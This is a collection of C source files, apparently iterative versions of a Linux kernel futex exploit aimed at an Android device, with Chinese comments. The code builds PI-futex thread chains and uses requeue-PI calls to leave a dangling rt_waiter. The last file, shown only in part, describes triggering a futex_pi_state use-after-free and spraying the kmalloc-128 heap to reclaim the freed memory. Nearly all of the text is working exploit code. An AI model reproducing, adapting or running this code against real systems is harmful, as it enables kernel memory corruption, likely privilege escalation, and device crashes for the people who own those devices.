	volatile int w_unlock_ret;
	volatile int w_tid, o_tid, o2_tid;
	volatile int w3_waiting, go_w3;
	volatile int done;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg_common(const char *fmt, va_list ap, int sync)
{
	char buf[400], line[480];
	int n;
	vsnprintf(buf, sizeof(buf), fmt, ap);
	n = snprintf(line, sizeof(line), "[%9.3fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (sync && logfd >= 0)
		fsync(logfd);
}

static void lg(const char *fmt, ...)          /* 带 fsync：崩溃可保 */
{
	va_list ap;
	va_start(ap, fmt);
	lg_common(fmt, ap, 1);
	va_end(ap);
}

static void lgn(const char *fmt, ...)         /* 不 fsync：用于窗口内，~50us */
{
	va_list ap;
	va_start(ap, fmt);
	lg_common(fmt, ap, 0);
	va_end(ap);
}

static long futex(uint32_t *u, int op, uint32_t val, void *to,
		  uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	while (ts->tv_nsec >= 1000000000L) {
		ts->tv_sec += 1;
		ts->tv_nsec -= 1000000000L;
	}
}

/* 轮询（会 sleep，仅用于非时间敏感环节） */
static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) {
		if (*p) return 1;
		usleep(2000);
	}
	return *p;
}

/* 无 syscall 忙轮询：只用 clock_gettime(vDSO) 做看门狗 */
static int spin_flag(volatile int *p, int ms)
{
	double t0 = now_ms();
	unsigned long i = 0;
	while (!*p) {
		if ((++i & 0x3FFF) == 0 && now_ms() - t0 > ms)
			return 0;
	}
	return 1;
}

static long lock_pi(uint32_t *u)
{
	return futex(u, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

static long unlock_pi(uint32_t *u)
{
	return futex(u, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

/* ---------------------------------------------------------------- W */
static void *thread_w(void *arg)
{
	struct timespec t1, t2;
	long r;

	(void)arg;
	r = lock_pi(&S->B_ring);
	if (r) { lg("W: LOCK_PI(B_ring) 失败 %ld errno=%d", r, errno); return NULL; }
	S->w_tid = (int)syscall(SYS_gettid);
	S->w_holds_ring = 1;
	r = lock_pi(&S->B3);
	if (r) { lg("W: LOCK_PI(B3) 失败 %ld errno=%d", r, errno); return NULL; }
	S->w_holds_b3 = 1;

	/* 两个绝对超时一次算好：frame1→frame2 之间不调 clock_gettime（vDSO 也不调） */
	abs_timeout(&t1, T1_MS);
	abs_timeout(&t2, T2_MS);

	while (!S->o_blocked_ring)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting_a = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t1, &S->C, 0);
	S->w_ret1 = (int)r;
	S->w_err1 = errno;
	S->w_returned1 = 1;

	/* 释放 B_ring ⇒ O 返回并停放（C 保持有主且不阻塞） */
	r = unlock_pi(&S->B_ring);
	S->w_unlock_ret = (int)r;

	/* 立即重入同路径：frame2 与 frame1 同址 */
	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t2, &S->C2, 0);
	S->w2_ret = (int)r;
	S->w2_err = errno;
	S->w2_returned = 1;

	/* 此后绝不进内核：不发 syscall、不解锁、不 yield */
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------------------------- O */
static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = lock_pi(&S->C);
	if (r) { lg("O: LOCK_PI(C) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o_tid = (int)syscall(SYS_gettid);
	S->o_holds_c = 1;
	while (!S->w_holds_ring)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked_ring = 1;
	r = lock_pi(&S->B_ring);
	if (r) { lg("O: LOCK_PI(B_ring) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o_parked = 1;
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------------------------- X */
static void *thread_x(void *arg)
{
	(void)arg;
	while (!S->o_parked)
		__asm__ __volatile__("" ::: "memory");
	S->x_entered_c = 1;
	(void)lock_pi(&S->C);          /* 使 C 的 waiters 树非空 */
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- O2 */
static void *thread_o2(void *arg)
{
	long r;
	(void)arg;
	while (!S->w_holds_b3)
		__asm__ __volatile__("" ::: "memory");
	r = lock_pi(&S->C2);
	if (r) { lg("O2: LOCK_PI(C2) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o2_tid = (int)syscall(SYS_gettid);
	S->o2_holds_c2 = 1;
	S->o2_blocked_b3 = 1;
	r = lock_pi(&S->B3);           /* 阻塞：owner = W ⇒ [10] 在此早退 */
	if (r) { lg("O2: LOCK_PI(B3) 失败 %ld errno=%d", r, errno); return NULL; }
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- X2 */
static void *thread_x2(void *arg)
{
	(void)arg;
	while (!S->o2_holds_c2)
		__asm__ __volatile__("" ::: "memory");
	S->x2_entered_c2 = 1;
	(void)lock_pi(&S->C2);
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- W3（预置） */
static void *thread_w3(void *arg)
{
	struct timespec t3;
	long r;
	(void)arg;
	while (!S->go_w3)
		__asm__ __volatile__("" ::: "memory");
	abs_timeout(&t3, T3_MS);
	S->w3_waiting = 1;
	errno = 0;
	r = futex(&S->A3, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t3, &S->C2, 0);
	lg("W3: WAIT_REQUEUE_PI(A3→C2) 返回 %ld errno=%d", r, errno);
	return NULL;
}

/* --------------------------------------------------------------- main */
int main(void)
{
	pthread_t tw, to, tx, to2, tx2, tw3;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G3C-V6 start pid=%d (§21.28 亚毫秒窗口) =====", getpid());
	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 4096);

	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	pthread_create(&to2, NULL, thread_o2, NULL);
	pthread_create(&tx, NULL, thread_x, NULL);
	pthread_create(&tx2, NULL, thread_x2, NULL);
	pthread_detach(tw); pthread_detach(to); pthread_detach(to2);
	pthread_detach(tx); pthread_detach(tx2);

	if (!wait_flag(&S->w_holds_ring, 3000) || !wait_flag(&S->w_holds_b3, 3000) ||
	    !wait_flag(&S->o_blocked_ring, 3000) || !wait_flag(&S->o2_blocked_b3, 3000) ||
	    !wait_flag(&S->w_waiting_a, 3000)) {
		lg("早期握手失败，终止"); _exit(2);
	}
	usleep(20000);

	/* [5] 装悬垂 */
	lg("[5] CMP_REQUEUE_PI(A→C,1)  (top_task=W, owner(B_ring)=W ⇒ 在 B_ring 早退)");
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[5] → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) { lg("[5] 未命中，终止"); _exit(3); }

	if (!wait_flag(&S->w_returned1, 4000)) { lg("[6] W 未从 frame1 返回，终止"); _exit(4); }
	lg("[6] W frame1 返回 %d errno=%d (%s)；UNLOCK_PI(B_ring)=%d；帧 1 已死",
	   S->w_ret1, S->w_err1, strerror(S->w_err1), S->w_unlock_ret);

	/* [7-9] 链条与 frame2 就位 */
	if (!wait_flag(&S->o_parked, 3000) || !wait_flag(&S->x_entered_c, 3000) ||
	    !wait_flag(&S->w2_waiting, 4000) || !wait_flag(&S->x2_entered_c2, 3000)) {
		lg("[7-9] 握手失败，终止"); _exit(5);
	}

	/* [9b] 预置 W3（v6 的关键改动：不在 [10b] 之后创建） */
	if (pthread_create(&tw3, NULL, thread_w3, NULL) != 0) {
		lg("[9b] W3 创建失败"); _exit(9);
	}
	pthread_detach(tw3);
	S->go_w3 = 1;
	if (!wait_flag(&S->w3_waiting, 3000)) { lg("[9b] W3 未进入等待，终止"); _exit(8); }
	lg("[9b] W3 已预置在 A3 上等待（C2 目标）");

	/* [10p] 无创前置断言：A2 上确有 requeue_pi waiter */
	{
		long pw;
		errno = 0;
		pw = futex(&S->A2, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
		if (pw == 0) { lg("[10p] A2 无 requeue_pi waiter，终止"); _exit(10); }
		lg("[10p] FUTEX_WAKE(A2,1) → %ld errno=%d (%s) (EINVAL=确有 waiter)", pw, errno, strerror(errno));
	}
	lg("[11d] 字值: A=%u A2=%u A3=%u C=%u C2=%u B3=%u Bring=%u | W=%d O=%d O2=%d",
	   S->A, S->A2, S->A3, S->C, S->C2, S->B3, S->B_ring, S->w_tid, S->o_tid, S->o2_tid);

	/* [10] 定向换向：写 waiter->lock=C2，仍在 B3 早退 */
	lg("[10] CMP_REQUEUE_PI(A2→C2,1)  (owner(B3)=W ⇒ 在 B3 早退；同时写 waiter->lock=C2)");
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
	e = errno;
	lg("[10] → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) {
		if (wait_flag(&S->w2_returned, 2000))
			lg("[10x] W frame2 已提前返回 %d errno=%d", S->w2_ret, S->w2_err);
		else
			lg("[10x] W frame2 仍在等待（未找到 waiter）");
		_exit(6);
	}

	/* ==== 窗口内：无 sleep 忙轮询帧 2 死亡，随即走查 ==== */
	if (!spin_flag(&S->w2_returned, 5000)) { lg("[10b] W 未从 frame2 返回，终止"); _exit(7); }

	{
		double tw0 = now_ms();
		lgn("[10b] 检测到 frame2 返回 %d errno=%d；窗口起点 t0",
		    S->w2_ret, S->w2_err);
		errno = 0;
		r = futex(&S->A3, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
		e = errno;
		lg("[12] → %ld errno=%d (%s)   窗口 = %.3f ms", r, e, strerror(e), now_ms() - tw0);
	}

	if (r == -1 && e == EDEADLK) {
		lg("verdict: **C1 成立** —— 槽内 lock==C2==orig_lock：同路径重入同址 + [10] 定向写入 + 帧死后仍被解引用");
	} else if (r >= 0) {
		lg("verdict: 对齐失败（安全出口）—— 帧 2 与帧 1 不同址或链条提前终止；C 与 O 须整体弃用");
	} else {
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	}
	_exit(0);
}

```

`tools/g3c_v7.c`:

```c
/*
 * g3c_v7.c — 自适应版（交接文档 §21.28.8 的 v7 设计）
 *
 * 目的：在一次运行内先零风险判定"X2 是否真的排在 C2 的 PI 队列上"，
 *       再据此决定是否允许走查触碰悬垂槽。
 *
 * 探针原理（4.9 futex_wake()）：
 *        plist_for_each_entry_safe(this, next, &hb->chain, list)
 *                if (match_futex(&this->key, key)) {
 *                        if (this->pi_state || this->rt_waiter) { ret = -EINVAL; break; }
 *   ⇒ 某 futex 上有已入队的 PI/requeue_pi 等待者时，FUTEX_WAKE 返回 -EINVAL；
 *     无等待者返回 0。且该分支在唤醒任何东西之前 break，**零副作用**。
 *
 * 为什么这条判定是决定性的：
 *   4.9 futex.c:2568/2109 —— 普通 FUTEX_LOCK_PI 的等待者在阻塞期间持有 pi_state 引用。
 *   ⇒ 只要 C2 上确有已入队的 PI waiter，[10] 的 put_pi_state 不可能归零 ⇒ pi_state 不被释放
 *     ⇒ 槽内 lock 始终有效 ⇒ 走查天然安全。
 *   ⇒ 若探针返回 0（无人排队），则 [10] 会真的释放 pi_state，必须先用额外 waiter 保住 refcount
 *     才允许走查。
 *
 * 分支：
 *   A) 探针(C2) == -EINVAL  ⇒ 已受保护，**不解引用槽**，直接收工（零风险）
 *   B) 探针(C2) == 0        ⇒ 未受保护；补 X3/X4 两个 PI waiter 并二次断言通过后，
 *                              再执行 [10] → 帧 2 死 → [12]（唯一可能重启的分支）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3c7.log"

#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG   128

#define T1_MS   400
#define T2_MS  2500
#define T3_MS  8000

static int logfd = -1;

struct shared {
	uint32_t A, A2, A3, B_ring, B3, C, C2;
	volatile int w_holds_ring, w_holds_b3;
	volatile int o_holds_c, o_blocked_ring, o_parked;
	volatile int x_entered_c;
	volatile int w_waiting_a;
	volatile int w_ret1, w_err1, w_returned1;
	volatile int w2_waiting, w2_ret, w2_err, w2_returned;
	volatile int o2_holds_c2, o2_blocked_b3;
	volatile int x2_entered_c2;
	volatile int w_unlock_ret;
	volatile int w_tid, o_tid, o2_tid;
	volatile int w3_waiting, go_w3;
	volatile int go_x3;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg_common(const char *fmt, va_list ap, int sync)
{
	char buf[400], line[480];
	int n;
	vsnprintf(buf, sizeof(buf), fmt, ap);
	n = snprintf(line, sizeof(line), "[%9.3fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (sync && logfd >= 0)
		fsync(logfd);
}

static void lg(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	lg_common(fmt, ap, 1);
	va_end(ap);
}

static void lgn(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	lg_common(fmt, ap, 0);
	va_end(ap);
}

static long futex(uint32_t *u, int op, uint32_t val, void *to,
		  uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	while (ts->tv_nsec >= 1000000000L) {
		ts->tv_sec += 1;
		ts->tv_nsec -= 1000000000L;
	}
}

static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) {
		if (*p) return 1;
		usleep(2000);
	}
	return *p;
}

static int spin_flag(volatile int *p, int ms)
{
	double t0 = now_ms();
	unsigned long i = 0;
	while (!*p) {
		if ((++i & 0x3FFF) == 0 && now_ms() - t0 > ms)
			return 0;
	}
	return 1;
}

/* 探针：返回 1 = 确有已入队 waiter（-EINVAL），0 = 无（返回 0），-1 = 其它 */
static int probe_waiters(uint32_t *u, int *raw_errno)
{
	long r;
	errno = 0;
	r = futex(u, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
	*raw_errno = errno;
	if (r == -1 && errno == EINVAL) return 1;
	if (r == 0) return 0;
	return -1;
}

static long lock_pi(uint32_t *u)
{
	return futex(u, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

static long unlock_pi(uint32_t *u)
{
	return futex(u, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

/* ---------------------------------------------------------------- W */
static void *thread_w(void *arg)
{
	struct timespec t1, t2;
	long r;

	(void)arg;
	r = lock_pi(&S->B_ring);
	if (r) { lg("W: LOCK_PI(B_ring) 失败 %ld errno=%d", r, errno); return NULL; }
	S->w_tid = (int)syscall(SYS_gettid);
	S->w_holds_ring = 1;
	r = lock_pi(&S->B3);
	if (r) { lg("W: LOCK_PI(B3) 失败 %ld errno=%d", r, errno); return NULL; }
	S->w_holds_b3 = 1;

	abs_timeout(&t1, T1_MS);
	abs_timeout(&t2, T2_MS);

	while (!S->o_blocked_ring)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting_a = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t1, &S->C, 0);
	S->w_ret1 = (int)r;
	S->w_err1 = errno;
	S->w_returned1 = 1;

	r = unlock_pi(&S->B_ring);
	S->w_unlock_ret = (int)r;

	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t2, &S->C2, 0);
	S->w2_ret = (int)r;
	S->w2_err = errno;
	S->w2_returned = 1;

	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------------------------- O */
static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = lock_pi(&S->C);
	if (r) { lg("O: LOCK_PI(C) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o_tid = (int)syscall(SYS_gettid);
	S->o_holds_c = 1;
	while (!S->w_holds_ring)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked_ring = 1;
	r = lock_pi(&S->B_ring);
	if (r) { lg("O: LOCK_PI(B_ring) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o_parked = 1;
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------------------------- X */
static void *thread_x(void *arg)
{
	(void)arg;
	while (!S->o_parked)
		__asm__ __volatile__("" ::: "memory");
	S->x_entered_c = 1;
	(void)lock_pi(&S->C);
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- O2 */
static void *thread_o2(void *arg)
{
	long r;
	(void)arg;
	while (!S->w_holds_b3)
		__asm__ __volatile__("" ::: "memory");
	r = lock_pi(&S->C2);
	if (r) { lg("O2: LOCK_PI(C2) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o2_tid = (int)syscall(SYS_gettid);
	S->o2_holds_c2 = 1;
	S->o2_blocked_b3 = 1;
	r = lock_pi(&S->B3);
	if (r) { lg("O2: LOCK_PI(B3) 失败 %ld errno=%d", r, errno); return NULL; }
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- X2 */
static void *thread_x2(void *arg)
{
	(void)arg;
	while (!S->o2_holds_c2)
		__asm__ __volatile__("" ::: "memory");
	S->x2_entered_c2 = 1;
	(void)lock_pi(&S->C2);
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------- X3/X4（分支 B 的 refcount 保险） */
static void *thread_x3(void *arg)
{
	(void)arg;
	while (!S->go_x3)
		__asm__ __volatile__("" ::: "memory");
	(void)lock_pi(&S->C2);
	for (;;)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- W3 */
static void *thread_w3(void *arg)
{
	struct timespec t3;
	long r;
	(void)arg;
	while (!S->go_w3)
		__asm__ __volatile__("" ::: "memory");
	abs_timeout(&t3, T3_MS);
	S->w3_waiting = 1;
	errno = 0;
	r = futex(&S->A3, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t3, &S->C2, 0);
	lg("W3: WAIT_REQUEUE_PI(A3→C2) 返回 %ld errno=%d", r, errno);
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t tw, to, tx, to2, tx2, tw3, tx3, tx4;
	long r;
	int e, pr, pe, got = 0, i;
	int live_mode = (argc > 1 && argv[1][0] == 'a');   /* A′：不等 frame2 死亡 */

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G3C-V7 start pid=%d mode=%s =====", getpid(), live_mode ? "A' (live frame)" : "adaptive");
	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 4096);

	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	pthread_create(&to2, NULL, thread_o2, NULL);
	pthread_create(&tx, NULL, thread_x, NULL);
	pthread_create(&tx2, NULL, thread_x2, NULL);

	if (!wait_flag(&S->w_holds_ring, 3000) || !wait_flag(&S->w_holds_b3, 3000) ||
	    !wait_flag(&S->o_blocked_ring, 3000) || !wait_flag(&S->o2_blocked_b3, 3000) ||
	    !wait_flag(&S->w_waiting_a, 3000)) {
		lg("早期握手失败，终止"); _exit(2);
	}
	usleep(20000);

	/* [5] 装悬垂 */
	lg("[5] CMP_REQUEUE_PI(A→C,1)");
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[5] → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) { lg("[5] 未命中，终止"); _exit(3); }

	if (!wait_flag(&S->w_returned1, 4000)) { lg("[6] W 未从 frame1 返回，终止"); _exit(4); }
	lg("[6] W frame1 返回 %d errno=%d (%s)；UNLOCK_PI(B_ring)=%d；帧 1 已死",
	   S->w_ret1, S->w_err1, strerror(S->w_err1), S->w_unlock_ret);

	if (!wait_flag(&S->o_parked, 3000) || !wait_flag(&S->x_entered_c, 3000) ||
	    !wait_flag(&S->w2_waiting, 4000) || !wait_flag(&S->x2_entered_c2, 3000)) {
		lg("[7-9] 握手失败，终止"); _exit(5);
	}

	if (pthread_create(&tw3, NULL, thread_w3, NULL) != 0) { lg("W3 创建失败"); _exit(9); }
	S->go_w3 = 1;
	if (!wait_flag(&S->w3_waiting, 3000)) { lg("W3 未进入等待，终止"); _exit(8); }

	/* ===== 探针阶段（零风险）：最多轮询 300 ms 等待 X2 入队 ===== */
	for (i = 0; i < 60; i++) {
		pr = probe_waiters(&S->C2, &pe);
		if (pr == 1) { got = 1; break; }
		usleep(5000);
	}
	lg("[P2] 探针 C2：%s (raw errno=%d) 经过 %d 轮 → %s",
	   pr == 1 ? "EINVAL ⇒ 有已入队 PI waiter" : (pr == 0 ? "0 ⇒ 无 waiter" : "其它"),
	   pe, i + 1,
	   pr == 1 ? "pi_state 的 refcount 已受保护" : "refcount 未受保护");
	{
		int ce;
		int cr = probe_waiters(&S->C, &ce);
		lg("[P1] 探针 C ：%s (raw errno=%d)  —— 交叉对照 X 是否入队",
		   cr == 1 ? "EINVAL ⇒ 有已入队 PI waiter" : (cr == 0 ? "0 ⇒ 无 waiter" : "其它"), ce);
	}

	if (pr == 1) {
		/* ---- 分支 A：refcount 已受保护，默认不解引用槽，零风险收工 ---- */
		lg("branch: A —— X2 已入队 ⇒ [10] 的 put_pi_state 不可能归零 ⇒ pi_state 未被释放");
		if (!live_mode) {
			lg("verdict: W1 模型的前提不成立；v6 的 panic 需另一解释。按 §21.28.8 判据：本分支不动悬垂槽，收工。");
			lg("---- 请外部脚本核对 uptime 连续性 ----");
			_exit(0);
		}
		lg("A′：仍执行 [10]，但**不等 frame2 死亡**就发 [12] —— 走查将读到**活的** rt_waiter");
		goto do_walk;
	}

	/* ---- 分支 B：refcount 未受保护，补 waiter 保住 pi_state ---- */
	lg("branch: B —— 无已入队 waiter ⇒ [10] 会真的释放 C2 的 pi_state；先补 refcount 再走查");
	pthread_create(&tx3, NULL, thread_x3, NULL);
	pthread_create(&tx4, NULL, thread_x3, NULL);
	S->go_x3 = 1;
	got = 0;
	for (i = 0; i < 60; i++) {
		pr = probe_waiters(&S->C2, &pe);
		if (pr == 1) { got = 1; break; }
		usleep(5000);
	}
	lg("[P3] 补齐后二次断言 C2：%s (raw errno=%d) 经过 %d 轮",
	   pr == 1 ? "EINVAL ⇒ refcount 已受保护" : "仍无 waiter", pe, i + 1);
	if (!got) {
		lg("verdict: 补充 waiter 未能入队，构造异常；为避免踩着未保护的 pi_state 走查，终止（不解引用槽）");
		_exit(15);
	}

do_walk:
	/* [10] 定向换向 */
	lg("[11d] 字值: A=%u A2=%u A3=%u C=%u C2=%u B3=%u Bring=%u | W=%d O=%d O2=%d",
	   S->A, S->A2, S->A3, S->C, S->C2, S->B3, S->B_ring, S->w_tid, S->o_tid, S->o2_tid);
	lg("[10] CMP_REQUEUE_PI(A2→C2,1)");
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
	e = errno;
	lg("[10] → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) {
		if (wait_flag(&S->w2_returned, 2000))
			lg("[10x] W frame2 已提前返回 %d errno=%d", S->w2_ret, S->w2_err);
		else
			lg("[10x] W frame2 仍在等待");
		_exit(6);
	}

	if (live_mode) {
		/* A′：frame2 仍存活（剩余寿命约 2 s），立刻走查 ⇒ 读的是活 rt_waiter */
		double tw0 = now_ms();
		lgn("[A'] frame2 仍存活（w2_returned=%d），立刻 [12]", S->w2_returned);
		errno = 0;
		r = futex(&S->A3, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
		e = errno;
		lg("[12] → %ld errno=%d (%s)   窗口 = %.3f ms（帧存活）",
		   r, e, strerror(e), now_ms() - tw0);
	} else {
		if (!spin_flag(&S->w2_returned, 5000)) { lg("[10b] W 未从 frame2 返回，终止"); _exit(7); }
		{
			double tw0 = now_ms();
			lgn("[10b] 检测到 frame2 返回 %d errno=%d；窗口起点 t0", S->w2_ret, S->w2_err);
			errno = 0;
			r = futex(&S->A3, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
			e = errno;
			lg("[12] → %ld errno=%d (%s)   窗口(W2) = %.3f ms", r, e, strerror(e), now_ms() - tw0);
		}
	}

	if (r == -1 && e == EDEADLK)
		lg(live_mode ? "verdict(A'): **走查形态本身无问题** —— 读到活 rt_waiter 时 lock==C2==orig_lock，正常返回 -EDEADLK"
			     : "verdict: **C1 成立** —— refcount 保住 pi_state，槽内 lock==C2==orig_lock，换向+走查首次安全落地");
	else if (r >= 0)
		lg("verdict: 对齐失败（安全出口）");
	else
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	_exit(0);
}

```

`tools/g3d_d2.c`:

```c
/*
 * g3d_d2.c — futex_pi_state UAF · D2：同 cache 回收 + 走查判定
 *
 * 依据（§21.15/§21.18）：
 *   - CMP_REQUEUE_PI 返回 -EDEADLK ⇒ put_pi_state 归零 ⇒ free_pi_state
 *     ⇒ rt_mutex_proxy_unlock + kfree（目标 futex 的 pi_state 被释放，
 *        内核 owner 变 NULL，用户态字值不变）。
 *   - 悬垂 waiter->lock = &被释放的 pi_state->pi_mutex（pi_state+0x10）。
 *   - 本机无 kmalloc-96/192 ⇒ 88 B 的 pi_state 落在 kmalloc-128。
 *
 * D2 逻辑：
 *   [1] 建环：W 持 B；O 持 C 且阻塞于 B；W 带超时等待 A→C。
 *   [2] main：CMP_REQUEUE_PI(A→C,1) → -EDEADLK（写 waiter->lock=C + 释放 C 的 pi_state）
 *   [3] W 超时早退 → 帧死亡，W->pi_blocked_on 悬垂于该槽（lock=旧 C 地址）
 *   [4] **同 CPU 喷堆**：创建 K 组「持有者 + 阻塞 waiter」的 PI futex，
 *       每组分配 1 个 pi_state（同 cache）。SLUB 的 LIFO 期望第一组就回收
 *       刚释放的那块 ⇒ 旧 C 地址重新变成**有效的** rt_mutex。
 *   [5] 走查判定：新 waiter W2 等 A2→C，main 发 CMP_REQUEUE_PI(A2→C,1)：
 *         链条 C(新pi_state)→O→B(owner W)→W→槽(lock=旧C)
 *         · 回收成功 ⇒ 旧 C 已是有效 rt_mutex：trylock 成功 → 走查安全落地 → 返回 0/1
 *         · 回收失败 ⇒ 旧 C 仍是释放内存 → 自旋或 panic
 *   判据：返回 0/1 且设备存活 = 回收成功（同一 cache 的 UAF 可被 pi_state 自身占用）。
 *
 * 安全：所有 futex 都是正常加解锁，无悬挂踢打；main 与喷堆线程绑定同一 CPU 提高
 *       LIFO 命中率。唯一风险在 [5]：若回收失败会 panic（需重启）。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3d_d2.log"
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_PRIVATE_FLAG   128
#define MSPRAY 24

static int logfd = -1;
static double t0;

struct pair {
	uint32_t word;
	volatile int held;
	volatile int waiter_in;
};

